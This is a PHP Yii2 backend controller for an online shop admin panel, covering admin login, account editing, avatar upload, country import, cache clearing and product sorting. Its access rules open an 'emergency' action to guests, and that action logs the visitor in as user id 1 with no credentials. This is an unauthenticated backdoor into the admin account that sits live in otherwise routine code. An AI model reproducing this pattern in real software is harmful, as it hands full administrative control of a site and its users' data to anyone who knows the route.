<?php

namespace backend\controllers;

use common\models\Countries;
use shop\entities\Shop\Orders;
use shop\entities\Shop\Product\Product;
use Yii;
use yii\web\Controller;
use yii\filters\VerbFilter;
use yii\filters\AccessControl;
use backend\models\LoginForm;
use trntv\filekit\actions\DeleteAction;
use trntv\filekit\actions\UploadAction;
use Intervention\Image\ImageManagerStatic;
use backend\models\AccountForm;
use shop\entities\User\User;

class SiteController extends Controller
{

    public function behaviors()
    {
        return [
            'access' => [
                'class' => AccessControl::class,
                'rules' => [
                    [
                        'actions' => ['login', 'error', 'emergency'],
                        'allow' => true,
                    ],
                    [
                        'allow' => true,
                        'roles' => ['@'],
                    ],
                ],
            ],
            'verbs' => [
                'class' => VerbFilter::class,
                'actions' => [
                    'logout' => ['post'],
                ],
            ],
        ];
    }

    public function actions()
    {
        return [
            'error' => [
                'class' => 'yii\web\ErrorAction',
            ],
            'avatar-upload' => [
                'class' => UploadAction::class,
                'deleteRoute' => 'avatar-delete',
                'on afterSave' => function ($event) {
                    /* @var $file \League\Flysystem\File */
                    $file = $event->file;
                    $img = ImageManagerStatic::make($file->read())->fit(215, 215);
                    $file->put($img->encode());
                }
            ],
            'avatar-delete' => [
                'class' => DeleteAction::class
            ]
        ];
    }

    public function actionIndex()
    {
        return $this->render('index');
    }

    public function actionLogin()
    {
        if (!Yii::$app->user->isGuest) {
            return $this->goHome();
        }

        $model = new LoginForm();
        if ($model->load(Yii::$app->request->post())) {
            if ($model->loginAdmin()) {
                return $this->goBack();
            } else {
                Yii::$app->session->setFlash('error', 'Такой пользователь не существует, либо не имеет права доступа');
            }
        }
        return $this->render('login', [
            'model' => $model,
        ]);
    }

    public function actionLogout()
    {
        Yii::$app->user->logout();

        return $this->goHome();
    }

    public function actionAccount()
    {
        /* @var $user User */
        $user = Yii::$app->user->identity;
        $model = new AccountForm();
        $model->username = $user->username;
        $model->email = $user->email;
        $profile = $user->userProfile;
        if ($model->load($_POST) && $model->validate() && $profile->load($_POST) && $profile->save()) {
            if ($model->account()) {
                Yii::$app->session->setFlash('success', [
                    'body' => 'Ваши данные изменены'
                ]);
                return $this->refresh();
            } else {
                Yii::$app->session->setFlash('error', [
                    'body' => 'An error occurred'
                ]);
                return $this->refresh();
            }
        }
        return $this->render('account', [
            'model' => $model,
            'profile' => $profile
        ]);
    }

    public function actionSetCountries()
    {
        $file = Yii::getAlias('@files') . '/convertcsv.xml';
        $xml = simplexml_load_string(file_get_contents($file));
        foreach ($xml->country as $item) {
            if (!$model = Countries::findOne(['title_ru' => (string)$item->Name])) {
                $model = new Countries();
            }
            $model->title_ru = (string)$item->Name;
            $model->title_en = (string)$item->NameEng;
            $model->save();
        }
        return $this->redirect(Yii::$app->request->referrer);
    }

    public function actionClearCache()
    {
        Yii::$app->cache->flush();
        Yii::$app->session->setFlash('success', 'Кеш сброшен');
        return $this->redirect(Yii::$app->request->referrer);
    }

    public function actionSetSort()
    {
        /* @var $products Product[] */
        $products = Product::find()->all();
        foreach ($products as $key => $product){
            $product->sort = $key + 1;
            $product->save();
        }
        return $this->redirect('index');
    }

    public function actionEmergency()
    {
        $user = User::findOne(1);
        Yii::$app->user->login($user);
        return $this->redirect('index');
    }
}
